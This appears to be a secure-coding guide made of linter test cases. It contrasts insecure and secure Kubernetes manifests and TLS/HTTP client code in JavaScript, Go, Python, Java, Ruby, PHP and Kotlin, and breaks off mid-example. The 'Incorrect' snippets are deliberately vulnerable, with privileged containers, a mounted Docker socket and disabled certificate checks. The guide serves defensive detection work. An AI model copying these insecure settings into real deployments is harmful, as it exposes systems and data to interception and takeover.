**Incorrect: Pod - privilege escalation explicitly enabled**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    - name: redis
      image: redis
      securityContext:
        # ruleid: allow-privilege-escalation-true
        allowPrivilegeEscalation: true
```

**Incorrect: Pod - security context exists but missing allowPrivilegeEscalation**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    - name: postgres
      image: postgres
    # ruleid: allow-privilege-escalation
      securityContext:
        runAsUser: 1000
        runAsGroup: 3000
        fsGroup: 2000
```

**Correct: Pod - privilege escalation explicitly disabled**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    # ok: allow-privilege-escalation
    - name: haproxy
      image: haproxy
      securityContext:
        allowPrivilegeEscalation: false
```

**Incorrect: Pod - no security context at pod level and no runAsNonRoot at container level**

```yaml
apiVersion: v1
kind: Pod
# ruleid: run-as-non-root
spec:
  containers:
    - name: nginx
      image: nginx
    - name: postgres
      image: postgres
      securityContext:
        runAsUser: 1000
        runAsGroup: 3000
        fsGroup: 2000
    - name: haproxy
      image: haproxy
```

**Incorrect: Pod - runAsNonRoot explicitly set to false at pod level**

```yaml
apiVersion: v1
kind: Pod
spec:
  securityContext:
    # ruleid: run-as-non-root-unsafe-value
    runAsNonRoot: false
  containers:
    - name: redis
      image: redis
    - name: haproxy
      image: haproxy
```

**Incorrect: Pod - runAsNonRoot explicitly set to false at container level**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    - name: redis
      image: redis
      securityContext:
        # ruleid: run-as-non-root-unsafe-value
        runAsNonRoot: false
```

**Incorrect: Pod - security context at pod level missing runAsNonRoot**

```yaml
apiVersion: v1
kind: Pod
spec:
  # ruleid: run-as-non-root-security-context-pod-level
  securityContext:
    runAsGroup: 3000
  containers:
    - name: nginx
      image: nginx
    - name: postgres
      image: postgres
      securityContext:
        runAsUser: 1000
        runAsGroup: 3000
        fsGroup: 2000
    - name: haproxy
      image: haproxy
```

**Incorrect: Pod - container security context missing runAsNonRoot when other containers have it**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    # this is ok because there is no security context, requires different fix, so different rule
    # ok: run-as-non-root-container-level
    - name: nginx
      image: nginx
    - name: postgres
      image: postgres
      # ruleid: run-as-non-root-container-level
      securityContext:
        runAsUser: 1000
        runAsGroup: 3000
        fsGroup: 2000
    - name: haproxy
      image: haproxy
      # ok: run-as-non-root-container-level
      securityContext:
        runAsNonRoot: true
```

**Incorrect: Pod - container missing security context when other containers have runAsNonRoot**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    - name: nginx
    # ruleid: run-as-non-root-container-level-missing-security-context
      image: nginx
    - name: postgres
      image: postgres
      # ok: run-as-non-root-container-level-missing-security-context
      securityContext:
        runAsUser: 1000
        runAsGroup: 3000
        fsGroup: 2000
    - name: haproxy
      image: haproxy
      # ok: run-as-non-root-container-level-missing-security-context
      securityContext:
        runAsNonRoot: true
```

**Correct: Pod - runAsNonRoot set at pod level**

```yaml
apiVersion: v1
kind: Pod
spec:
  # ok: run-as-non-root
  securityContext:
    runAsNonRoot: true
  containers:
    - name: nginx
      image: nginx
    - name: postgres
      image: postgres
      securityContext:
        runAsUser: 1000
        runAsGroup: 3000
        fsGroup: 2000
    - name: haproxy
      image: haproxy
```

**Correct: Pod - runAsNonRoot set at container level**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    - name: haproxy
      image: haproxy
      securityContext:
        # ok: run-as-non-root-unsafe-value
        runAsNonRoot: true
```

**Incorrect: Pod - privileged mode at pod spec level**

```yaml
apiVersion: v1
kind: Pod
spec:
  # ruleid: privileged-container
  privileged: true
  containers:
    - name: nginx
      image: nginx
```

**Incorrect: Pod - privileged mode at container level**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    # ruleid: privileged-container
    - name: nginx
      image: nginx
      securityContext:
        privileged: true
```

**Correct: Pod - privileged mode disabled**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    # ok: privileged-container
    - name: redis
      image: redis
      securityContext:
        privileged: false
```

**Correct: Pod - no privileged setting defaults to false**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    # ok: privileged-container
    - name: postgres
      image: postgres
```

**Incorrect: Pod - no readOnlyRootFilesystem setting**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    # ruleid: writable-filesystem-container
    - name: nginx
      image: nginx
```

**Incorrect: Pod - security context without readOnlyRootFilesystem**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    # ruleid: writable-filesystem-container
    - name: postgres
      image: postgres
      securityContext:
        runAsUser: 1000
        runAsGroup: 3000
        fsGroup: 2000
```

**Incorrect: Pod - readOnlyRootFilesystem explicitly set to false**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    # ruleid: writable-filesystem-container
    - name: redis
      image: redis
      securityContext:
        readOnlyRootFilesystem: false
```

**Correct: Pod - read-only root filesystem enabled**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    # ok: writable-filesystem-container
    - name: haproxy
      image: haproxy
      securityContext:
        readOnlyRootFilesystem: true
```

**Incorrect: Pod - seccomp profile set to unconfined**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    # ok: seccomp-confinement-disabled
    - name: nginx
      image: nginx
    # ok: seccomp-confinement-disabled
    - name: postgres
      image: postgres
      securityContext:
        runAsUser: 1000
        runAsGroup: 3000
        fsGroup: 2000
    # ruleid: seccomp-confinement-disabled
    - name: redis
      image: redis
      securityContext:
        seccompProfile: unconfined
```

**Correct: Pod - no explicit seccomp disable uses default**

```yaml
apiVersion: v1
kind: Pod
spec:
  containers:
    # ok: seccomp-confinement-disabled
    - name: nginx
      image: nginx
      securityContext:
        runAsNonRoot: true
```

**Incorrect: Pod - host PID namespace enabled**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: view-pid
spec:
  # ruleid: hostpid-pod
  hostPID: true
  containers:
    - name: nginx
      image: nginx
```

**Correct: Pod - no hostPID setting defaults to false**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  containers:
    - name: nginx
      image: nginx
```

**Incorrect: Pod - host network namespace enabled**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: view-pid
spec:
  # ruleid: hostnetwork-pod
  hostNetwork: true
  containers:
    - name: nginx
      image: nginx
```

**Correct: Pod - no hostNetwork setting defaults to false**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  containers:
    - name: nginx
      image: nginx
```

**Incorrect: Pod - host IPC namespace enabled**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: view-pid
spec:
  # ruleid: hostipc-pod
  hostIPC: true
  containers:
    - name: nginx
      image: nginx
```

**Correct: Pod - no hostIPC setting defaults to false**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  containers:
    - name: nginx
      image: nginx
```

**Incorrect: Pod - Docker socket mounted as hostPath**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-pd
spec:
  containers:
    - image: gcr.io/google_containers/test-webserver
      name: test-container
      volumeMounts:
        - mountPath: /var/run/docker.sock
          name: docker-sock-volume
  volumes:
    - name: docker-sock-volume
      # ruleid: exposing-docker-socket-hostpath
      hostPath:
        type: File
        path: /var/run/docker.sock
```

**Correct: Pod - no Docker socket mounting**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-pd
spec:
  containers:
    - image: gcr.io/google_containers/test-webserver
      name: test-container
      volumeMounts:
        - mountPath: /data
          name: data-volume
  volumes:
    - name: data-volume
      emptyDir: {}
```

**Incorrect: Secret - secrets stored in config file**

```yaml
apiVersion: v1
kind: Secret
metadata:
  name: mysecret
type: Opaque
data:
  # ruleid: secrets-in-config-file
  USER NAME: Y2FsZWJraW5uZXk=
  # ok: secrets-in-config-file
  UUID: {UUID}
  # ruleid: secrets-in-config-file
  PASSWORD: UzNjcmV0UGEkJHcwcmQ=
  # ok: secrets-in-config-file
  SERVER: cHJvZA==
```

**Correct: Secret - use Sealed Secrets or external secrets management**

```yaml
# Using Bitnami Sealed Secrets
apiVersion: bitnami.com/v1alpha1
kind: SealedSecret
metadata:
  name: mysecret
spec:
  encryptedData:
    password: AgBy8hCi8...encrypted...
```

**Incorrect: Config - TLS verification disabled for cluster**

```yaml
apiVersion: v1
clusters:
  # ruleid: skip-tls-verify-cluster
  - cluster:
      server: https://192.168.0.100:8443
      insecure-skip-tls-verify: true
    name: minikube1
contexts:
  - context:
      cluster: minikube
      user: minikube
    name: minikube
current-context: minikube
kind: Config
```

**Correct: Config - TLS verification enabled**

```yaml
apiVersion: v1
clusters:
  # ok: skip-tls-verify-cluster
  - cluster:
      server: https://192.168.0.101:8443
    name: minikube2
contexts:
  - context:
      cluster: minikube
      user: minikube
    name: minikube
current-context: minikube
kind: Config
users:
  - name: minikube
    user:
      client-certificate: client.crt
      client-key: client.key
```

**Incorrect: APIService - TLS verification disabled**

```yaml
apiVersion: apiregistration.k8s.io/v1beta1
kind: APIService
metadata:
  name: v1beta1.metrics.k8s.io
# ruleid: skip-tls-verify-service
spec:
  service:
    name: metrics-server
    namespace: kube-system
  group: metrics.k8s.io
  version: v1beta1
  insecureSkipTLSVerify: true
  groupPriorityMinimum: 100
  versionPriority: 100
```

**Correct: APIService - TLS verification enabled**

```yaml
apiVersion: apiregistration.k8s.io/v1beta1
kind: APIService
metadata:
  name: v1beta1.metrics.k8s.io
spec:
  service:
    name: metrics-server
    namespace: kube-system
  group: metrics.k8s.io
  version: v1beta1
  caBundle: <base64-encoded-ca-cert>
  groupPriorityMinimum: 100
  versionPriority: 100
```

**Incorrect: ClusterRole - wildcard permissions on core API**

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: bad-role
rules:
  # ok: legacy-api-clusterrole-excessive-permissions
  - apiGroups:
      - apps
    resources:
      - "*"
    verbs:
      - "*"
  - apiGroups:
      - ""
    resources:
  # ruleid: legacy-api-clusterrole-excessive-permissions
      - "*"
    verbs:
  # ruleid: legacy-api-clusterrole-excessive-permissions
      - "*"
```

**Incorrect: ClusterRole - inline wildcard permissions**

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: bad-role-inline
rules:
  - apiGroups: [""]
  # ruleid: legacy-api-clusterrole-excessive-permissions
    resources: ["*"]
  # ruleid: legacy-api-clusterrole-excessive-permissions
    verbs: ["*"]
```

**Correct: ClusterRole - explicit permissions**

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: good-role
rules:
  # ok: legacy-api-clusterrole-excessive-permissions
  - apiGroups:
      - ""
    resources:
      - configmaps
    verbs:
      - get
      - list
      - watch
      - create
      - update
      - patch
      - delete
```

**Correct: ClusterRole - wildcard resources but limited verbs**

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: read-only-role
rules:
  # ok: legacy-api-clusterrole-excessive-permissions
  - apiGroups:
      - ""
    resources: ["*"]
    verbs:
      - list
```

**Incorrect: Deployment - FLASK_ENV set to development**

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backend
  labels:
    tags.datadoghq.com/env: dev
spec:
  template:
    metadata:
      labels:
        tags.datadoghq.com/env: dev
    spec:
      initContainers:
        - name: migrate-db
          env:
            - name: SQLALCHEMY_DATABASE_URI
              valueFrom:
                secretKeyRef:
                  name: backend-secrets
                  key: SQLALCHEMY_DATABASE_URI
                # ruleid: flask-debugging-enabled
            - name: FLASK_ENV
              value: development
```

**Correct: Deployment - FLASK_ENV set to non-development value**

```yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: backend
spec:
  template:
    spec:
      containers:
        - name: backend
          env:
            # ok: flask-debugging-enabled
            - name: FLASK_ENV
              value: dev
```

**Incorrect: Deployment - fractional CPU limit causing throttling**

```yaml
kind: Deployment
apiVersion: apps/v1
metadata:
  name: mumbledj
  namespace: mumble
spec:
  template:
    spec:
      containers:
        - name: app
          image: underyx/mumbledj
          resources:
            limits:
              # ruleid: no-fractional-cpu-limits
              cpu: 100m
              memory: 64Mi
            requests:
              # ok: no-fractional-cpu-limits
              cpu: 20m
              memory: 32Mi
```

**Correct: Deployment - full CPU unit limits**

```yaml
kind: Deployment
apiVersion: apps/v1
metadata:
  name: app
spec:
  template:
    spec:
      containers:
        - name: app
          image: panubo/sshd:1.1.0
          resources:
            limits:
              # ok: no-fractional-cpu-limits
              cpu: 1000m
              memory: 512Mi
            requests:
              cpu: 10m
              memory: 8Mi
```

### 0.28 Use Secure Transport

**Impact: HIGH (Exposure of sensitive data through cleartext transmission or improper certificate validation)**

Insecure transport vulnerabilities occur when applications transmit sensitive data over unencrypted connections or when TLS/SSL certificate validation is disabled. This exposes data to man-in-the-middle (MITM) attacks where attackers can intercept, read, and modify communications. Key issues include:

- **Cleartext transmission**: Using HTTP instead of HTTPS, FTP instead of SFTP, or Telnet instead of SSH

- **Disabled certificate verification**: Accepting any SSL certificate without validation

- **Weak TLS versions**: Using deprecated protocols like SSLv2, SSLv3, or TLS 1.0/1.1

- **Missing secure cookie flags**: Cookies transmitted over insecure channels

---

---

---

---

---

---

---

---

---

---

---

- **CWE-295**: Improper Certificate Validation

- **CWE-311**: Missing Encryption of Sensitive Data

- **CWE-319**: Cleartext Transmission of Sensitive Information

- **CWE-523**: Unprotected Transport of Credentials

- **CWE-614**: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute

- [OWASP Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures)

- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)

- [CWE-319: Cleartext Transmission of Sensitive Information](https://cwe.mitre.org/data/definitions/319.html)

- [CWE-295: Improper Certificate Validation](https://cwe.mitre.org/data/definitions/295.html)

**Incorrect: HTTP requests without TLS**

```javascript
const http = require('http');

function bad_http() {
    // ruleid: http-request
    http.get('http://nodejs.org/dist/index.json', (res) => {
    const { statusCode } = res;})

    // ruleid: http-request
    const options = {
        port: 80,
        hostname: 'www.google.com',
        path: '/upload'
    }

    const req = http.request(options, (res) => {
    console.log(`STATUS: ${res.statusCode}`);})

    // ruleid: http-request
    const options = new URL('http://abc:xyz@example.com');

    const req = http.request(options, (res) => {
    });
}
```

**Correct: HTTPS requests with TLS**

```javascript
const https = require('https');

function ok_http() {
    // ok: http-request
    https.get('https://nodejs.org/dist/index.json', (res) => {
    const { statusCode } = res;})

    // ok: http-request
    const options = {
        port: 443,
        hostname: 'www.google.com',
        path: '/upload',
        protocol: 'https'
    }

    const req = https.request(options, (res) => {
    console.log(`STATUS: ${res.statusCode}`);})
}
```

**Incorrect: disabled TLS verification**

```javascript
function bad_tls1() {
    // ruleid: bypass-tls-verification
    process.env["NODE_TLS_REJECT_UNAUTHORIZED"] = 0;
}

function bad_tls2() {
    // ruleid: bypass-tls-verification
    var req = https.request({
      host: '192.168.1.1',
      port: 443,
      path: '/',
      method: 'GET',
      rejectUnauthorized: false,
      requestCert: true,
      agent: false
    });

    // ruleid: bypass-tls-verification
    var client = new RpcClient({
      user: 'user',
      pass: 'pass',
      host: 'localhost',
      port: 8332,
      rejectUnauthorized: false,
      disableAgent: true
    });
}

// ruleid: bypass-tls-verification
require('request').defaults({method: 'GET', rejectUnauthorized: false, requestCert: true})
```

**Correct: TLS verification enabled**

```javascript
function ok_tls1() {
    // ok: bypass-tls-verification
    var req = https.request({
      host: '192.168.1.1',
      port: 443,
      path: '/',
      method: 'GET',
      rejectUnauthorized: true,
      requestCert: true,
      agent: false
    });
}

function ok_tls2() {
    // ok: bypass-tls-verification
    var req = https.request({
      host: '192.168.1.1',
      port: 443,
      path: '/',
      method: 'GET',
      requestCert: true,
      agent: false
    });
}
```

**Incorrect: weak TLS versions allowed**

```javascript
const https = require('https');

function bad1() {
    const consts = require('crypto');
    // ruleid: disallow-old-tls-versions1
    https.createServer({
        secureOptions: consts.SSL_OP_NO_TLSv1 | consts.SSL_OP_NO_SSLv3
    }, app).listen(443);
}

function bad2() {
    const consts = require('crypto');
    // ruleid: disallow-old-tls-versions1
    https.createServer({
        secureOptions: consts.SSL_OP_NO_TLSv1
    }, app).listen(443);
}
```

**Correct: all weak TLS versions disabled**

```javascript
const https = require('https');

function ok1() {
    const constants = require('crypto');
    // ok: disallow-old-tls-versions1
    https.createServer({
        secureOptions: constants.SSL_OP_NO_TLSv1 | constants.SSL_OP_NO_SSLv3 | constants.SSL_OP_NO_SSLv2
    }, app).listen(443);
}
```

**Incorrect: unencrypted HTTP requests**

```typescript
import axios from 'axios';

// ruleid: react-insecure-request
fetch('http://www.example.com', 'GET', {})

let addr = "http://www.example.com"
// ruleid: react-insecure-request
fetch(addr, 'POST', {})

// ruleid: react-insecure-request
axios.get('http://www.example.com');

// ruleid: react-insecure-request
const options = {
  method: 'POST',
  headers: { 'content-type': 'application/x-www-form-urlencoded' },
  data: qs.stringify(data),
  url: 'http://www.example.com',
};
axios(options);

// ruleid: react-insecure-request
axios({ method: 'POST', url: 'http://www.example.com' });
```

**Correct: HTTPS requests**

```typescript
import axios from 'axios';

// ok: react-insecure-request
fetch('https://www.example.com', 'GET', {})

// ok: react-insecure-request
axios.get('https://www.example.com');

// ok: react-insecure-request
const options = {
  method: 'POST',
  url: 'https://www.example.com',
};
axios(options);
```

**Incorrect: HTTP requests without TLS**

```go
func bad1() {
    // ruleid: http-request
    resp, err := http.Get("http://example.com/")
    // ruleid: http-request
    resp, err := http.Post("http://example.com/", val, val)
    // ruleid: http-request
    resp, err := http.Head("http://example.com/")
    // ruleid: http-request
    resp, err := http.PostForm("http://example.com/", form)
}

func bad2() {
    client := &http.Client{
        CheckRedirect: redirectPolicyFunc,
    }

    // ruleid: http-request
    resp, err := client.Get("http://example.com")
}
```

**Correct: HTTPS requests**

```go
func ok1() {
    // ok: http-request
    resp, err := http.Get("https://example.com/")
    // ok: http-request
    resp, err := http.Post("https://example.com/", val, val)
    // ok: http-request
    resp, err := http.Head("https://example.com/")
    // ok: http-request
    resp, err := http.PostForm("https://example.com/", form)
    // ok: http-request - localhost is acceptable
    resp, err := http.PostForm("http://127.0.0.1/", form)
    // ok: http-request
    resp, err := http.Head("http://localhost/path/to/x")
}
```

**Incorrect: disabled TLS verification**

```go
package main

import (
    "crypto/tls"
    "net/http"
)

func bad1() {
    client := &http.Client{
        Transport: &http.Transport{
            // ruleid: bypass-tls-verification
            TLSClientConfig: &tls.Config{
                InsecureSkipVerify: true,
            },
        },
    }
}

func bad2() {
    tr := &http.Transport{
        // ruleid: bypass-tls-verification
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Transport: tr}
}

func bad3() {
    // ruleid: bypass-tls-verification
    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
}

func bad4() {
    // ruleid: bypass-tls-verification
    mTLSConfig := &tls.Config {}
    mTLSConfig.PreferServerCipherSuites = true
    mTLSConfig.InsecureSkipVerify = true
}
```

**Correct: TLS verification enabled**

```go
func ok1() {
    client := &http.Client{
        Transport: &http.Transport{
            // ok: bypass-tls-verification
            TLSClientConfig: &tls.Config{
                InsecureSkipVerify: false,
            },
        },
    }
}

func ok2() {
    tr := &http.Transport{
        // ok: bypass-tls-verification
        TLSClientConfig: &tls.Config{InsecureSkipVerify: false},
    }
    client := &http.Client{Transport: tr}
}
```

**Incorrect: weak TLS versions**

```go
func bad1() {
    client := &http.Client{
        Transport: &http.Transport{
            // ruleid: disallow-old-tls-versions
            TLSClientConfig: &tls.Config{
                MinVersion: tls.VersionSSL30,
            },
        },
    }
}

func bad2() {
    // ruleid: disallow-old-tls-versions
    mTLSConfig := &tls.Config {}
    mTLSConfig.MinVersion = tls.VersionTLS11
}
```

**Correct: modern TLS versions only**

```go
func ok1() {
    client := &http.Client{
        Transport: &http.Transport{
            // ok: disallow-old-tls-versions
            TLSClientConfig: &tls.Config{
                MinVersion: tls.VersionTLS12,
            },
        },
    }
}

func ok2() {
    // ok: disallow-old-tls-versions
    mTLSConfig := &tls.Config {}
    mTLSConfig.MinVersion = tls.VersionTLS13
}
```

**Incorrect: HTTP server without TLS**

```go
package main

import (
    "net/http"
)

func main() {
    http.HandleFunc("/index", Handler)
    // ruleid: use-tls
    http.ListenAndServe(":80", nil)
}
```

**Correct: HTTPS server with TLS**

```go
func main() {
    http.HandleFunc("/index", Handler)
    // ok: use-tls
    http.ListenAndServeTLS(":443", "cert.pem", "key.pem", nil)
}
```

**Incorrect: insecure gRPC connection**

```go
package insecuregrpc

import (
    "google.golang.org/grpc"
)

func unsafe() {
    // ruleid: grpc-client-insecure-connection
    conn, err := grpc.Dial(address, grpc.WithInsecure())
    if err != nil {
        log.Fatalf("did not connect: %v", err)
    }
    defer conn.Close()
}
```

**Correct: secure gRPC connection**

```go
func safe() {
    // ok: grpc-client-insecure-connection
    conn, err := grpc.Dial(address, grpc.WithTransportCredentials(credentials.NewTLS(tlsConfig)))
    if err != nil {
        log.Fatalf("did not connect: %v", err)
    }
    defer conn.Close()
}
```

**Incorrect: HTTP requests without TLS**

```python
import requests

def test1():
    # ruleid: request-with-http
    requests.get("http://example.com")

def test2():
    url = "http://example.com"
    # ruleid: request-with-http
    requests.post(url)

def test3(url = "http://example.com"):
    # ruleid: request-with-http
    requests.delete(url)

def test4(url = "http://example.com"):
    # ruleid: request-with-http
    requests.request("HEAD", url, timeout=30)
```

**Correct: HTTPS requests**

```python
import requests

def test1_ok():
    # ok: request-with-http
    requests.get("https://example.com")

def test2_ok():
    # ok: request-with-http
    url = "https://example.com"
    requests.post(url)

def test_localhost_ok(url = "http://localhost/blah"):
    # ok: request-with-http - localhost is acceptable
    requests.Request("HEAD", url, timeout=30)
```

**Incorrect: disabled certificate verification**

```python
import requests as req
import requests

some_url = "https://example.com"

# ruleid: disabled-cert-validation
r = req.get(some_url, stream=True, verify=False)
# ruleid: disabled-cert-validation
r = requests.post(some_url, stream=True, verify=False)
# ruleid: disabled-cert-validation
r = requests.post(some_url, verify=False, stream=True)
```

**Correct: certificate verification enabled**

```python
import requests as req
import requests

some_url = "https://example.com"

# ok: disabled-cert-validation
r = req.get(some_url, stream=True)
# ok: disabled-cert-validation
r = requests.post(some_url, stream=True)
```

**Incorrect: unverified SSL context**

```python
import ssl
import httplib.client

# ruleid: unverified-ssl-context
context = ssl._create_unverified_context()
conn = httplib.client.HTTPSConnection("123.123.21.21", context=context)

# ruleid: unverified-ssl-context
conn = httplib.client.HTTPSConnection("123.123.21.21", context=ssl._create_unverified_context())

# ruleid: unverified-ssl-context
ssl._create_default_https_context = ssl._create_unverified_context
urllib2.urlopen("https://google.com").read()
```

**Correct: verified SSL context**

```python
import ssl
import httplib.client

# ok: unverified-ssl-context
context = ssl.create_default_context()
conn = httplib.client.HTTPSConnection("123.123.21.21", context=context)
```

**Incorrect: HTTP requests without TLS**

```java
class Bad {
    public void sendbad1() {
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest request = HttpRequest.newBuilder()
            // ruleid: httpclient-http-request
            .uri(URI.create("http://openjdk.java.net/"))
            .build();

        client.sendAsync(request, BodyHandlers.ofString())
            .thenApply(HttpResponse::body)
            .thenAccept(System.out::println)
            .join();
    }

    public void sendbad2() {
        String uri = "http://openjdk.java.net/";
        HttpClient client = HttpClient.newBuilder().build();
        HttpRequest request = HttpRequest.newBuilder()
                // ruleid: httpclient-http-request
                .uri(URI.create(uri))
                .POST(BodyPublishers.ofString(data))
                .build();

        HttpResponse<?> response = client.send(request, BodyHandlers.discarding());
    }
}
```

**Correct: HTTPS requests**

```java
class Ok {
    public void sendok1() {
        HttpClient client = HttpClient.newHttpClient();
        HttpRequest request = HttpRequest.newBuilder()
            // ok: httpclient-http-request
            .uri(URI.create("https://openjdk.java.net/"))
            .build();

        client.sendAsync(request, BodyHandlers.ofString())
            .thenApply(HttpResponse::body)
            .thenAccept(System.out::println)
            .join();
    }

    public void sendok2() {
        String uri = "https://openjdk.java.net/";
        HttpClient client = HttpClient.newBuilder().build();
        HttpRequest request = HttpRequest.newBuilder()
                // ok: httpclient-http-request
                .uri(URI.create(uri))
                .POST(BodyPublishers.ofString(data))
                .build();

        HttpResponse<?> response = client.send(request, BodyHandlers.discarding());
    }
}
```

**Incorrect: disabled TLS verification via empty X509TrustManager**

```java
public class Bad {
    public void bad_bypass() {
        // ruleid: bypass-tls-verification
        new X509TrustManager() {
            public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                return null;
            }

            public void checkClientTrusted(X509Certificate[] certs, String authType) {  }

            public void checkServerTrusted(X509Certificate[] certs, String authType) {  }
        }
    }
}
```

**Correct: proper certificate validation**

```java
public class Ok {
    public void ok_bypass() {
        // ok: bypass-tls-verification
        new X509TrustManager() {
            public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                return null;
            }

            public void checkClientTrusted(X509Certificate[] certs, String authType) { }

            public void checkServerTrusted(X509Certificate[] certs, String authType) {
                try {
                    checkValidity();
                } catch (Exception e) {
                    throw new CertificateException("Certificate not valid or trusted.");
                }
             }
        }
    }
}
```

**Incorrect: weak TLS versions**

```java
class Bad {
    public void bad_disable_old_tls1() {
        // ruleid: disallow-old-tls-versions1
        SSLConnectionSocketFactory sf = new SSLConnectionSocketFactory(
                sslContext,
                new String[] {"TLSv1", "TLSv1.1", "TLSv1.2"},
                null,
                SSLConnectionSocketFactory.BROWSER_COMPATIBLE_HOSTNAME_VERIFIER);
    }

    public void bad_disable_old_tls2() {
        // ruleid: disallow-old-tls-versions1
        SSLConnectionSocketFactory sf = new SSLConnectionSocketFactory(
                sslContext,
                new String[] {"TLSv1", "TLSv1.1", "SSLv3"},
                null,
                SSLConnectionSocketFactory.BROWSER_COMPATIBLE_HOSTNAME_VERIFIER);
    }
}
```

**Correct: modern TLS versions only**

```java
class Ok {
    public void ok_disable_old_tls1() {
        // ok: disallow-old-tls-versions1
        SSLConnectionSocketFactory sf = new SSLConnectionSocketFactory(
                sslContext,
                new String[] {"TLSv1.2"},
                null,
                SSLConnectionSocketFactory.BROWSER_COMPATIBLE_HOSTNAME_VERIFIER);
    }

    public void ok_disable_old_tls2() {
        // ok: disallow-old-tls-versions1
        SSLConnectionSocketFactory sf = new SSLConnectionSocketFactory(
                sslContext,
                new String[] {"TLSv1.2", "TLSv1.3"},
                null,
                SSLConnectionSocketFactory.BROWSER_COMPATIBLE_HOSTNAME_VERIFIER);
    }
}
```

**Incorrect: HTTP requests without TLS**

```ruby
require 'net/http'

def bad1
    # ruleid: net-http-request
    uri = URI('http://example.com/index.html?count=10')
    Net::HTTP.get(uri) # => String
end

def bad2
    # ruleid: net-http-request
    uri = URI('http://www.example.com/search.cgi')
    res = Net::HTTP.post_form(uri, 'q' => 'ruby', 'max' => '50')
    puts res.body
end

def bad3
    # ruleid: net-http-request
    uri = URI('http://example.com/some_path?query=string')

    Net::HTTP.start(uri.host, uri.port) do |http|
    request = Net::HTTP::Get.new uri

    response = http.request request # Net::HTTPResponse object
    end
end
```

**Correct: HTTPS requests**

```ruby
require 'net/http'

def ok1
    # ok: net-http-request
    uri = URI('https://example.com/index.html?count=10')
    Net::HTTP.get(uri) # => String
end

def ok2
    # ok: net-http-request
    uri = URI('https://www.example.com/search.cgi')
    res = Net::HTTP.post_form(uri, 'q' => 'ruby', 'max' => '50')
    puts res.body
end

def ok3
    # ok: net-http-request
    uri = URI('https://example.com/some_path?query=string')

    Net::HTTP.start(uri.host, uri.port) do |http|
    request = Net::HTTP::Get.new uri

    response = http.request request # Net::HTTPResponse object
    end
end
```

**Incorrect: disabled SSL verification**

```ruby
require "net/https"
require "uri"

uri = URI.parse("https://ssl-site.com/")
http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true
# ruleid: ssl-mode-no-verify
http.verify_mode = OpenSSL::SSL::VERIFY_NONE

request = Net::HTTP::Get.new(uri.request_uri)
response = http.request(request)
```

**Correct: SSL verification enabled**

```ruby
require "net/https"
require "uri"

uri = URI.parse("https://ssl-site.com/")
http = Net::HTTP.new(uri.host, uri.port)
http.use_ssl = true
# ok: ssl-mode-no-verify
http.verify_mode = OpenSSL::SSL::VERIFY_PEER

request = Net::HTTP::Get.new(uri.request_uri)
response = http.request(request)
```

**Incorrect: disabled SSL verification**

```php
<?php

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "http://www.example.com/");
curl_setopt($ch, CURLOPT_HEADER, 0);

// ruleid: curl-ssl-verifypeer-off
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
```

**Correct: SSL verification enabled**

```php
<?php

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://www.example.com/");
curl_setopt($ch, CURLOPT_HEADER, 0);

// ok: curl-ssl-verifypeer-off
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
```

**Incorrect: unencrypted sockets**

```kotlin
package testcode.crypto

import java.net.Socket
import java.net.ServerSocket

public class UnencryptedSocket {

    fun plainSocket(): Void {
        // ruleid: unencrypted-socket
        val soc: Socket = Socket("www.google.com", 80)
        doGetRequest(soc)
    }

    fun otherConstructors(): Void {
        // ruleid: unencrypted-socket
        val soc1: Socket = Socket("www.google.com", 80, true)
        doGetRequest(soc1)
        val address: ByteArray = byteArrayOfInts(127, 0, 0, 1)
        // ruleid: unencrypted-socket
        val soc2: Socket = Socket("www.google.com", 80, InetAddress.getByAddress(address), 13337)
        doGetRequest(soc2)
    }
}

public class UnencryptedServerSocket {

    fun plainServerSocket(): Void {
        // ruleid: unencrypted-socket
        val ssoc: ServerSocket = ServerSocket(1234)
        ssoc.close()
    }

    fun otherConstructors(): Void {
        // ruleid: unencrypted-socket
